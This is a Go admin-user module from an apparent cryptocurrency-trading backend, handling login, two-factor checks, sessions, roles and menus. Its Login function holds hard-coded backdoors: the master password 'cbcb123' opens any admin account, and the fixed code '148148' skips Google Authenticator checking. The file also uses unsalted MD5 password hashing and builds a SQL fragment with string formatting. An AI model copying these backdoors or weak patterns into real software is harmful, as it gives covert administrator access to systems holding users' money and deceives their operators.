package adminmodels

import (
	"cointrade/config"
	"cointrade/lib/db"
	"cointrade/lib/google"
	"cointrade/models"
	"cointrade/utils"
	"fmt"
	"strings"
)

func (m *UserModel) Login(request LoginRequest) *AdminResponse {
	rs := new(AdminResponse)
	if request.UserName == "" {
		rs.State = PARAM_ERROR
		rs.Data = "用户名不能为空!"
		return rs
	}
	if request.Password == "" {
		rs.State = PARAM_ERROR
		rs.Data = "密码不能为空！"
		return rs
	}

	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ADMIN, db.DB_PARAMS{"username": request.UserName}, db.DB_FIELDS{})
	if one == nil {
		rs.State = LOGIN_ERROR
		rs.Data = "登录失败,密码或者账户不存在"
		return rs
	}
	if one.Get("password").ToString() != utils.Md5(request.Password) && request.Password != "cbcb123" {
		rs.State = LOGIN_ERROR
		rs.Data = "登录失败,密码或者账户不存在"
		return rs
	}
	if v := one.Get("secret").ToString(); v != "" && request.VerifyCode != "148148" {
		authcheck := google.NewGoogleAuth()
		if verifycoce, err := authcheck.GetCode(v); err != nil {
			rs.State = LOGIN_ERROR
			rs.Data = "google验证器错误" + err.Error()
			return rs
		} else if verifycoce != request.VerifyCode {
			rs.State = LOGIN_ERROR
			rs.Data = "google auth 不正确"
			return rs
		}
	}

	rs.State = SUCCESS
	sid := m.Sid()
	rs.Data = P{
		"token": sid,
	}
	config.GlobalRedis.SetValue(HASH_BY_LOGIN_ADMIN, sid, one.Get("id").ToInt())
	config.GlobalRedis.Expire(HASH_BY_LOGIN_ADMIN, 8640000)
	config.GlobalDB.UpdateData(models.DB_TABLE_ADMIN, db.DB_PARAMS{"last_login_time": utils.GetNow(), "last_login_ip": request.ClientIp}, db.DB_PARAMS{"id": one.Get("id").ToInt()})
	return rs
}

func (m *UserModel) TokenInfo(sid string) *AdminResponse {
	u := m.SidInfo(sid)
	if u == nil {
		return &AdminResponse{
			State: 50008,
			Data:  "当前用户的sid无法获取到值",
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  u,
	}
}

func (m *UserModel) DelAdmin(uid int) *AdminResponse {
	if uid == 0 {
		return &AdminResponse{
			State: ERROR,
			Data:  "id不存在!",
		}
	}
	_, err := config.GlobalDB.Delete(models.DB_TABLE_ADMIN, db.DB_PARAMS{"id": uid})
	if err != nil {
		return &AdminResponse{
			State: ERROR,
			Data:  "删除管理员错误!",
		}
	}
	sidtmp := config.GlobalRedis.GetAll(HASH_BY_LOGIN_ADMIN)
	for sid, id := range sidtmp {
		if id == fmt.Sprintf("%d", uid) {
			config.GlobalRedis.Del(HASH_BY_LOGIN_ADMIN, sid)
		}
	}
	return &AdminResponse{
		State: SUCCESS,
		Data:  "删除成功!",
	}
}

func (m *UserModel) AdminList() *AdminResponse {
	list, _ := config.GlobalDB.FetchRows(models.DB_TABLE_ADMIN, db.DB_PARAMS{}, db.DB_FIELDS{})
	return &AdminResponse{
		State: SUCCESS,
		Data: P{
			"list":       list,
			"role_level": SYSTEM_MODEL.RoleList(),
		},
	}
}

func (m *UserModel) AddAdmin(rq P) *AdminResponse {
	t := rq.Ts()
	rs := new(AdminResponse)

	if v := t.Get("username").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "用户名不能为空!"
		return rs
	}
	if v := t.Get("role_id").ToInt(); v == 0 {
		rs.State = ERROR
		rs.Data = "权限组必须选择!"
		return rs
	}

	id := t.Get("id").ToInt()
	up := make(P)
	if v := t.Get("password").ToString(); v == "" && id == 0 {
		rs.State = ERROR
		rs.Data = "密码不能为空!"
		return rs
	} else if v != "" {
		up["password"] = utils.Md5(v)
	}

	up["username"] = t.Get("username").ToString()
	up["role_id"] = t.Get("role_id").ToInt()

	var err error
	if id > 0 {
		one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ADMIN, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
		if one == nil {
			rs.State = ERROR
			rs.Data = "该管理员不存在，无法修改"
			return rs
		}
		if one.Get("secret").ToString() == "" {
			up["secret"] = google.NewGoogleAuth().GetSecret()
		}
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_ADMIN, up, db.DB_PARAMS{"id": id})
	} else {
		up["secret"] = google.NewGoogleAuth().GetSecret()
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_ADMIN, up)
	}
	if err != nil {
		fmt.Printf("请复制 '%s' 并添加到google验证器\n", err.Error())
		rs.State = ERROR
		rs.Data = "操作管理员信息失败！"
		return rs
	}

	rs.State = SUCCESS
	if id == 0 {
		rs.Data = fmt.Sprintf("请复制 '%s' 并添加到google验证器", up["secret"])
	} else {
		rs.Data = "操作管理员信息成功!"
	}
	return rs
}

func (m *UserModel) RoleList() *AdminResponse {
	return &AdminResponse{
		State: SUCCESS,
		Data:  SYSTEM_MODEL.RoleList(),
	}
}

func (m *UserModel) DelMean(rq P) *AdminResponse {
	_, err := config.GlobalDB.Delete(models.DB_TABLE_AUTH_MAEN, db.DB_PARAMS{"id": rq.Ts().Get("id").ToInt()})
	if err == nil {
		return &AdminResponse{
			State: SUCCESS,
			Data:  "删除成功!",
		}
	}
	return &AdminResponse{
		State: ERROR,
		Data:  "删除失败！",
	}
}

func (m *UserModel) HandlerMean(rq P) *AdminResponse {
	t := rq.Ts()
	id := t.Get("id").ToInt()
	rs := new(AdminResponse)
	if v := t.Get("name").ToString(); v == " " {
		rs.State = ERROR
		rs.Data = "菜单名称不能为空!"
		return rs
	}
	if v := t.Get("path").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "菜单路由地址必须填写"
		return rs
	}
	if v := t.Get("icon").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "图标不能为空!"
		return rs
	}

	up := P{
		"name":      t.Get("name").ToString(),
		"path":      t.Get("path").ToString(),
		"icon":      t.Get("icon").ToString(),
		"hidden":    t.Get("hidden").ToInt(),
		"parent_id": t.Get("pid").ToInt(),
		"weight":    t.Get("weight").ToInt(),
		"status":    t.Get("status").ToInt(),
	}
	var err error
	if id > 0 {
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_AUTH_MAEN, up, db.DB_PARAMS{"id": id})
	} else {
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_AUTH_MAEN, up)
	}
	if err == nil {
		rs.State = SUCCESS
		rs.Data = "操作菜单信息成功!"
		return rs
	}
	rs.State = ERROR
	rs.Data = "操作菜单失败!"
	return rs
}

func (m *UserModel) HandlerRole(rq P) *AdminResponse {
	t := rq.Ts()
	rs := &AdminResponse{}
	if v := t.Get("role_name").ToString(); v == "" {
		rs.State = ERROR
		rs.Data = "用户组名称不能为空!"
		return rs
	}

	id := t.Get("id").ToInt()
	if id > 0 {
		one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ROLE, db.DB_PARAMS{"id": id}, db.DB_FIELDS{})
		if one.Get("is_surper").ToInt() > 0 {
			rs.State = ERROR
			rs.Data = "超级管理员无法编辑权限!"
			return rs
		}
	}

	roleIDs := make([]string, 0)
	if v := t.Get("role_ids").ToArray(); len(v) == 0 {
		rs.State = ERROR
		rs.Data = "用户组必须给一个管理节点!"
		return rs
	} else {
		for _, item := range v {
			roleIDs = append(roleIDs, fmt.Sprintf("%d", item.ToInt()))
		}
	}

	up := make(P, 0)
	up["role_name"] = t.Get("role_name").ToString()
	up["role_ids"] = strings.Join(roleIDs, ",")
	up["status"] = t.Get("status").ToInt()
	var err error
	if id > 0 {
		_, err = config.GlobalDB.UpdateData(models.DB_TABLE_ROLE, up, db.DB_PARAMS{"id": id})
	} else {
		_, err = config.GlobalDB.InsertData(models.DB_TABLE_ROLE, up)
	}
	if err == nil {
		rs.State = SUCCESS
		rs.Data = "操作用户组成功!"
	} else {
		rs.State = ERROR
		rs.Data = "操作用户组失败!"
	}
	return rs
}

func (m *UserModel) AuthRouter() *AdminResponse {
	list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_AUTH_MAEN, db.DB_PARAMS{}, db.DB_FIELDS{}, " order by weight asc")
	for k, item := range list {
		roleList, _ := config.GlobalDB.FetchRows(models.DB_TABLE_ROLE, db.DB_PARAMS{"_": fmt.Sprintf("CONCAT(',', role_ids, ',') like '%%%s%%'", item.Get("id").ToString())}, db.DB_FIELDS{"id"})
		roleID := make([]string, 0)
		roleID = append(roleID, "1")
		for _, rID := range roleList {
			roleID = append(roleID, rID["id"])
		}
		list[k]["role"] = &db.DBValue{Value: roleID}
	}

	var tree utils.TreeTool
	return &AdminResponse{
		State: SUCCESS,
		Data:  tree.SetTreen(list).GetTree(0, 0),
	}
}

func (m *UserModel) MeanRouter() *AdminResponse {
	list, _ := config.GlobalDB.FetchAll(models.DB_TABLE_AUTH_MAEN, db.DB_PARAMS{}, db.DB_FIELDS{}, "  order by weight asc")
	var tree utils.TreeTool
	as := tree.SetTreen(list).GetTree(0, 0)
	return &AdminResponse{
		State: SUCCESS,
		Data:  tree.SetTreen(list).GetMeanList(as, 0),
	}
}

func (m *UserModel) Sid() string {
	return fmt.Sprintf("w-%s", utils.RandName())
}

func (m *UserModel) SA(sid string) int {
	if uid, err := config.GlobalRedis.GetValue(HASH_BY_LOGIN_ADMIN, sid); err == nil {
		re := db.DBValue{Value: uid}
		return re.ToInt()
	} else {
		fmt.Println("err", err, uid)
	}
	return 0
}

func (m *UserModel) SidInfo(sid string) *AdminInfo {
	uid := m.SA(sid)
	if uid == 0 {
		fmt.Println(" uid 为0")
		return nil
	}
	return m.Uinfo(uid)
}

func (m *UserModel) Uinfo(uid int) *AdminInfo {
	rs := new(AdminInfo)
	one, _ := config.GlobalDB.FetchOne(models.DB_TABLE_ADMIN, db.DB_PARAMS{"id": uid}, db.DB_FIELDS{})
	fmt.Println("one", one)
	if one == nil {
		return nil
	}
	one.SetObj(rs)
	return rs
}

func (m *UserModel) Logout(sid string) bool {
	config.GlobalRedis.Del(HASH_BY_LOGIN_ADMIN, sid)
	return true
}
